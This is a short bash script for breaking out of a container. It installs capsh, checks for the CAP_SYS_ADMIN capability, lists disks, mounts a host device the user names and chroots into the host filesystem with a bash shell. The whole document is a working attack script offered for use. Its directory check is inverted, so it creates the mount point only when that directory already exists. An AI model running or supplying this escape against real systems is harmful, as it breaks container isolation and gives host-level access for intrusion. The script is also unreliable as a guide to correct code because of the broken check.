apt update && apt install -y libcap2  # Install module for capsh
capsh --print  # Check if CAP_SYS_ADMIN capability is activated
fdisk -l  # Check if there is a device that mount the host filesystem
echo "Type the device: "
read device
echo "Type a destination: "
read dest

# Check if the directory exists or not
if [[ -d ${dest} ]]; then
	mkdir -p ${dest}
fi;

mount ${device} ${dest}  # Mount the device on the destination
chroot ${dest} bash  # change the root directory and execute bash
